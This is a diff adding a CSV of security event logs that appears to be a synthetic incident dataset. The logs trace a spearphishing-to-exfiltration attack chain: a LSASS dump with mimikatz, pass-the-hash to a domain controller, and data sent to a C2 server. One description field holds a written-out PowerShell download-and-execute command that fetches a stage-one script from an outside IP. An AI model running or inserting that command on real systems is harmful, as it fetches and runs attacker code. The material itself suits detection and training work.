@@ -1,0 +1,8 @@
+timestamp,event_id,event_type,user,host,process,ip_address,severity,description,file_path
+2026-08-14T09:00:00Z,4624,USER_LOGIN,j.smith,WORKSTATION-04,explorer.exe,192.168.1.104,LOW,User j.smith logged in successfully from Workstation 04,C:\Windows\System32\explorer.exe
+2026-08-14T09:03:15Z,4688,SPEARPHISHING_CLICK,j.smith,WORKSTATION-04,outlook.exe,192.168.1.104,MEDIUM,User opened malicious email attachment invoice_Q3_2026.pdf.exe,C:\Users\j.smith\Downloads\invoice_Q3_2026.pdf.exe
+2026-08-14T09:04:10Z,4688,POWERSHELL_OBFUSCATED,j.smith,WORKSTATION-04,powershell.exe,192.168.1.104,HIGH,Obfuscated PowerShell command executed: iex(New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage1.ps1'),C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+2026-08-14T09:06:45Z,4672,PRIVILEGE_ESCALATION,j.smith,WORKSTATION-04,cmd.exe,192.168.1.104,HIGH,Privilege escalation token impersonation via SeDebugPrivilege,C:\Windows\System32\cmd.exe
+2026-08-14T09:10:20Z,10,MIMIKATZ_LSASS_DUMP,SYSTEM,WORKSTATION-04,mimikatz.exe,192.168.1.104,CRITICAL,lsass.exe memory dumped to file lsass.dmp for NTLM hash extraction,C:\Temp\lsass.dmp
+2026-08-14T09:15:00Z,4624,PASS_THE_HASH,svc_domain_admin,DC-PRIMARY-01,mstsc.exe,192.168.1.104,CRITICAL,Pass-the-Hash lateral movement from 192.168.1.104 to Domain Controller DC-PRIMARY-01,C:\Windows\System32\mstsc.exe
+2026-08-14T09:22:30Z,5145,DATA_EXFILTRATION,svc_domain_admin,DC-PRIMARY-01,7z.exe,198.51.100.99,CRITICAL,Encrypted archive customer_vault_2026.7z exfiltrated to C2 server 198.51.100.99 (4.8 GB),C:\Backup\customer_vault_2026.7z
